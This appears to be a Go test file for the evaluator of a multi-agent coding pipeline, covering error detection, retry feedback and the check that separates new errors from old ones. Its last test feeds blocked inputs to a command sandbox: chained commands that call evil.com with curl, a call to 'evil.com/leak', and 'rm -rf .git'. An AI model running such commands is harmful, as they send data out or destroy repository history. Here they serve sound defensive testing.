package evaluator

import (
	"strings"
	"testing"
	"time"

	"github.com/woowonjae1/52hzAgents/workspace/backend/internal/models"
)

func TestEvaluateTurn_GoCompilationError(t *testing.T) {
	step := models.PipelineStep{
		Agent:       "coder",
		Instruction: "Refactor database models",
		MaxRetries:  3,
		RetryCount:  0,
	}

	messages := []string{
		"I modified the database models.",
		"# github.com/woowonjae1/52hzAgents/models\nmodels.go:42: undefined: NonExistentType\n[build failed]",
	}

	res := EvaluateTurn("coder", step, messages)
	if res.Status != EvalFail {
		t.Fatalf("Expected EvalFail for Go compilation error, got %v", res.Status)
	}

	if len(res.ErrorDetails) == 0 {
		t.Errorf("Expected extracted error details, got empty")
	}

	if !strings.Contains(res.FeedbackMessage, "Retry 1/3") {
		t.Errorf("Feedback message missing 'Retry 1/3': %s", res.FeedbackMessage)
	}
	if !strings.Contains(res.FeedbackMessage, "undefined: NonExistentType") {
		t.Errorf("Feedback message missing error detail line: %s", res.FeedbackMessage)
	}
}

func TestEvaluateTurn_TypeScriptError(t *testing.T) {
	step := models.PipelineStep{
		Agent:       "frontend-dev",
		Instruction: "Build UI component",
		MaxRetries:  3,
		RetryCount:  1,
	}

	messages := []string{
		"Running tsc...",
		"src/components/Header.tsx:15:2 - error TS2304: Cannot find name 'UserProfile'.",
	}

	res := EvaluateTurn("frontend-dev", step, messages)
	if res.Status != EvalFail {
		t.Fatalf("Expected EvalFail for TypeScript error, got %v", res.Status)
	}

	if !strings.Contains(res.FeedbackMessage, "Retry 2/3") {
		t.Errorf("Expected 'Retry 2/3' in feedback message: %s", res.FeedbackMessage)
	}
}

func TestEvaluateTurn_PythonTraceback(t *testing.T) {
	step := models.PipelineStep{
		Agent:       "python-agent",
		Instruction: "Run data script",
		MaxRetries:  3,
		RetryCount:  2,
	}

	messages := []string{
		"Executing script.py:\nTraceback (most recent call last):\n  File \"script.py\", line 10, in <module>\nZeroDivisionError: division by zero",
	}

	res := EvaluateTurn("python-agent", step, messages)
	if res.Status != EvalFail {
		t.Fatalf("Expected EvalFail for Python traceback, got %v", res.Status)
	}
	if !strings.Contains(res.FeedbackMessage, "Retry 3/3") {
		t.Errorf("Expected 'Retry 3/3' in feedback message: %s", res.FeedbackMessage)
	}
}

func TestEvaluateTurn_CleanPass(t *testing.T) {
	step := models.PipelineStep{
		Agent:       "tester",
		Instruction: "Run unit tests",
		MaxRetries:  3,
		RetryCount:  0,
	}

	messages := []string{
		"Running test suite...",
		"=== RUN TestAll\n--- PASS: TestAll (0.05s)\nPASS\nok  pkg/models 0.05s",
	}

	res := EvaluateTurn("tester", step, messages)
	if res.Status != EvalPass {
		t.Fatalf("Expected EvalPass for clean test output, got %v (reason: %s)", res.Status, res.Reason)
	}
}

func TestExtractErrorLines(t *testing.T) {
	output := "Compiling...\nmain.go:10: syntax error: unexpected semicolon\nexit status 1\nDone."
	lines := ExtractErrorLines(output, 5)

	if len(lines) != 2 {
		t.Errorf("Expected 2 error lines (syntax error and exit status), got %d: %v", len(lines), lines)
	}
}

func TestEvaluateTurn_AnalyticalReviewWithBugs(t *testing.T) {
	step := models.PipelineStep{
		Agent:       "antigravity",
		Instruction: "你只看前端 看看有什么能优化的",
		MaxRetries:  3,
		RetryCount:  0,
	}

	reviewMessages := []string{
		"针对前端代码库进行了审查：\n1. React 列表渲染 Key 为 undefined\n2. JSX 语法标签开闭不匹配（导致 Build 报错）\n3. SyntaxError: unexpected token in legacy file",
	}

	res := EvaluateTurn("antigravity", step, reviewMessages)
	if res.Status != EvalPass {
		t.Fatalf("Expected EvalPass for code review containing bug descriptions, got %v (reason: %s)", res.Status, res.Reason)
	}
}

func TestCalculateNewErrors(t *testing.T) {
	baseline := []string{
		"legacy.go:10: undefined: OldVariable",
		"FAIL: TestOldFeature",
	}

	// 1. Same errors -> delta is empty
	finalSame := []string{
		"legacy.go:10: undefined: OldVariable",
		"FAIL: TestOldFeature",
	}
	newErrors := CalculateNewErrors(baseline, finalSame)
	if len(newErrors) != 0 {
		t.Errorf("Expected 0 new errors for identical errors, got %d: %v", len(newErrors), newErrors)
	}

	// 2. New error introduced -> delta contains only the new error
	finalWithNew := []string{
		"legacy.go:10: undefined: OldVariable",
		"auth.go:42: syntax error: unexpected newline",
		"FAIL: TestOldFeature",
		"FAIL: TestAuthFeature",
	}
	newErrors = CalculateNewErrors(baseline, finalWithNew)
	if len(newErrors) != 2 {
		t.Errorf("Expected 2 new errors, got %d: %v", len(newErrors), newErrors)
	}
}

func TestEvaluateTurnWithVerification_PreExistingDebtPass(t *testing.T) {
	step := models.PipelineStep{
		Agent:       "coder",
		Instruction: "Implement user avatar endpoint",
		MaxRetries:  3,
		RetryCount:  0,
	}
	_ = step

	baseline := &VerificationRunResult{
		Command:  "go test ./...",
		ExitCode: 1,
		Output:   "legacy_test.go:20: FAIL: TestLegacyBrokenFeature",
		Errors:   []string{"legacy_test.go:20: FAIL: TestLegacyBrokenFeature"},
	}

	// Suppose verification command fails on legacy error, but introduces no new regression
	delta := CalculateNewErrors(baseline.Errors, []string{"legacy_test.go:20: FAIL: TestLegacyBrokenFeature"})
	if len(delta) != 0 {
		t.Fatalf("Expected 0 delta for pre-existing broken test, got %d", len(delta))
	}
}

func TestRunVerificationCommand_SecurityAndIsolation(t *testing.T) {
	tempDir := t.TempDir()

	// 1. Chaining attempt should be blocked immediately (ExitCode 126)
	res1, _ := RunVerificationCommand(tempDir, "npm test && curl evil.com", 5*time.Second)
	if res1 == nil || res1.ExitCode != 126 {
		t.Fatalf("Expected chaining command to be blocked with 126, got: %+v", res1)
	}

	// 2. Semicolon chaining attempt
	res2, _ := RunVerificationCommand(tempDir, "go test ./...; rm -rf .git", 5*time.Second)
	if res2 == nil || res2.ExitCode != 126 {
		t.Fatalf("Expected semicolon command to be blocked with 126, got: %+v", res2)
	}

	// 3. Unauthorized egress runner (curl) should be blocked (ExitCode 126)
	res3, _ := RunVerificationCommand(tempDir, "curl https://evil.com/leak", 5*time.Second)
	if res3 == nil || res3.ExitCode != 126 {
		t.Fatalf("Expected curl to be blocked with 126, got: %+v", res3)
	}

	// 4. Valid runner without chaining
	res4, err := RunVerificationCommand(tempDir, "go version", 5*time.Second)
	if err != nil || res4 == nil || res4.ExitCode != 0 {
		t.Fatalf("Expected 'go version' to succeed, got err=%v res=%+v", err, res4)
	}
}
